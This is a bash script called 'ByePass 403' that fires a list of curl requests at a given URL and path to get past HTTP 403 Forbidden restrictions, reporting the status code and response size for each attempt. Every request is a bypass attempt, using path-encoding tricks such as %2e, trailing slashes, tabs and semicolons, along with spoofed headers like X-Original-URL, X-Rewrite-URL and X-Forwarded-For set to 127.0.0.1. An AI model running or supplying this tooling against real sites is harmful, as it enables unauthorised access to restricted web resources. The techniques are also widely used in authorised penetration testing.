#! /bin/bash
echo "===================================================================="
echo "                             
               +-+-+-+-+-+-+-+ +-+-+-+
               |B|y|e|P|a|s|s| |4|0|3|
               +-+-+-+-+-+-+-+ +-+-+-+"
echo "                     By @kab33r"
echo "===================================================================="
echo "          Usage:./byepass.sh https://example.com path"

echo "                                                                                                        "
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
echo "  --> ${1}/${2}"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
echo "  --> ${1}/%2e/${2}"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
echo "  --> ${1}/${2}/."
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
echo "  --> ${1}//${2}//"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
echo "  --> ${1}/./${2}/./"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20
echo "  --> ${1}/${2}%20"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09
echo "  --> ${1}/${2}%09"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?
echo "  --> ${1}/${2}?"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html
echo "  --> ${1}/${2}.html"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?anything
echo "  --> ${1}/${2}/?anything"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2#
echo "  --> ${1}/${2}#"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/;
echo "  --> ${1}/${2}/;/"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/~
echo "  --> ${1}/${2}/~"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Override-URL: $2" $1/$2
echo "  --> ${1}/${2} -H X-Override-URL: ${2}"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Originating-IP: 127.0.0.1" $1/$2
echo "  --> ${1} -H X-Originating-IP: 127.0.0.1"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Client-IP: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Client-IP: 127.0.0.1"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Origin: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-Origin: 127.0.0.1"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For-Original: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For-Original: 127.0.0.1"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Server: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-Server: http://127.0.0.1"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: localhost" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-Host: localhost"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Rewrite-URL: $2" $1
echo "  --> ${1} -H X-Rewrite-URL: ${2}"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-IP: 127.0.0.1" $1/$2
echo "  --> ${1} -H X-Remote-IP: 127.0.0.1"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-Address: localhost" $1/$2
echo "  --> ${1} -H X-Remote-Address: localhost"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: $1" $1/$2
echo "  --> ${1} -H X-Host: $1"
echo "========================================================================================================"
